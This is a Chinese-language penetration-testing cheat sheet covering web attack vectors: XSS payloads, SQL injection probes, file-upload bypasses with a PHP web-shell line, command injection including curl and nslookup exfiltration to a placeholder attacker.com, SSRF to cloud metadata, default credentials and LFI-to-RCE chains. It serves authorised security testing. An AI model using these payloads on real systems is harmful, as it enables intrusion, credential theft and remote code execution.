# 攻击向量与检测技术

## XSS攻击检测技术
### 检测方法
1. **主动注入检测**: 在URL参数、表单输入、HTTP头注入测试Payload
2. **DOM分析**: 分析页面JS代码中的危险函数（innerHTML、eval、document.write）
3. **编码绕过**: 测试URL编码、HTML实体、Unicode、Base64等编码
4. **事件处理器**: `onerror`、`onload`、`onmouseover`、`onfocus` 等20+事件

### Payload分类
| 类别 | 示例 | 用途 |
|------|------|------|
| Script标签 | `<script>alert('XSS')</script>` | 基础检测 |
| IMG事件 | `<img src=x onerror=alert(1)>` | 绕过过滤 |
| SVG | `<svg/onload=alert(1)>` | 绕过过滤 |
| 伪协议 | `javascript:alert(1)` | href属性 |
| CSS注入 | `expression(alert(1))` | IE专属 |
| HTML5 | `<video><source onerror=alert(1)>` | 新型向量 |

---

## SQL注入检测技术
### 检测方法
1. **错误回显法**: 单引号、双引号、反斜杠触发数据库错误
2. **布尔盲注**: `AND 1=1` / `AND 1=2` 比较响应差异
3. **时间盲注**: `AND sleep(5)`、`WAITFOR DELAY`、`pg_sleep`
4. **Union注入**: 探测列数后 `UNION SELECT 1,2,3...`
5. **带外注入(OOB)**: DNS/HTTP外带数据

### 数据库差异识别
| 数据库 | 探测语句 | 时间盲注 |
|--------|----------|----------|
| MySQL | `SELECT @@version` | `sleep(N)` |
| MSSQL | `SELECT @@version` | `WAITFOR DELAY '0:0:N'` |
| Oracle | `SELECT banner FROM v$version` | `DBMS_LOCK.SLEEP(N)` |
| PostgreSQL | `SELECT version()` | `pg_sleep(N)` |
| SQLite | `SELECT sqlite_version()` | `randomblob(N*1000000)` |
| MongoDB | `{$where: 'sleep(N)'}` | N/A(NoSQL) |

---

## 文件上传检测技术
### 检测方法
1. **扩展名测试**: .php、.jsp、.asp、.aspx、.phtml
2. **Content-Type绕过**: 修改为image/jpeg后上传
3. **双扩展名**: shell.php.jpg、shell.php%00.jpg
4. **大小写**: shell.Php、shell.pHp
5. **图片马**: GIF89a + `<?php system($_GET['cmd']); ?>`
6. **竞争上传**: 在上传后删除前访问文件
7. **MIME绕过**: 自定义Content-Type

### 上传成功标志
- 文件可访问并执行
- 返回文件路径
- 返回文件ID/URL

---

## 命令执行检测技术
### 检测方法
1. **分隔符测试**: `;`、`|`、`||`、`&`、`&&`、`%0a`、`%0d`
2. **子命令**: `$(cmd)`、`` `cmd` ``
3. **时间延迟**: `sleep 5`、`ping -c 5 127.0.0.1`
4. **外带数据**: `curl attacker.com/?d=$(whoami)`、`nslookup $(whoami).attacker.com`
5. **文件写入**: `echo test > /tmp/pwned`

### 命令分隔符
| 分隔符 | 含义 | Linux | Windows |
|--------|------|-------|---------|
| ; | 顺序执行 | ✓ | ✗ |
| \| | 管道 | ✓ | ✓ |
| \|\| | 或逻辑 | ✓ | ✓ |
| & | 后台执行 | ✓ | ✓(cmd) |
| && | 与逻辑 | ✓ | ✓ |
| %0a | 换行 | ✓ | ✗ |
| %0d%0a | 回车换行 | ✗ | ✓ |

---

## SSRF检测技术
### 检测方法
1. **内网探测**: http://127.0.0.1:22、http://10.0.0.1:6379
2. **云元数据**: http://169.254.169.254/latest/meta-data/
3. **协议测试**: file:///etc/passwd、dict://127.0.0.1:6379
4. **DNS外带**: http://xxx.attacker.com
5. **跳转绕过**: 使用302跳转到内网地址

### 常见内网服务端口
| 端口 | 服务 | 攻击方式 |
|------|------|----------|
| 22 | SSH | 弱口令爆破 |
| 6379 | Redis | 未授权写WebShell |
| 3306 | MySQL | 弱口令/Gopher协议 |
| 27017 | MongoDB | 未授权访问 |
| 11211 | Memcached | UDP放大攻击 |
| 9200 | Elasticsearch | 未授权RCE |

---

## 弱口令检测技术
### 检测方法
1. **字典爆破**: 常用弱口令Top100、Top1000
2. **默认口令**: admin/admin、root/root、tomcat/tomcat
3. **组合爆破**: 用户名+常见后缀（admin123、root123456）
4. **社会工程学**: 根据目标信息生成自定义字典

### 常见默认口令表
| 服务 | 用户名 | 密码 |
|------|--------|------|
| Tomcat | tomcat | tomcat |
| Jenkins | admin | admin |
| phpMyAdmin | root | (空) |
| WebLogic | weblogic | welcome1 |
| JBoss | admin | admin |
| RabbitMQ | guest | guest |

---

## LFI/目录遍历检测技术
### 检测方法
1. **路径穿越**: ../../../etc/passwd、....//....//
2. **PHP封装器**: php://filter、php://input、data://
3. **日志注入**: /var/log/apache2/access.log
4. **编码绕过**: %2e%2e%2f、..%252f..%252f
5. **空字节**: %00截断后缀
6. **绝对路径**: /etc/passwd、C:\windows\win.ini

### LFI到RCE链条
1. 日志污染 → 包含日志执行PHP
2. /proc/self/environ → User-Agent注入
3. php://input → POST body代码执行
4. Session文件包含 → Session变量注入
5. /proc/self/fd/ → FD文件描述符利用
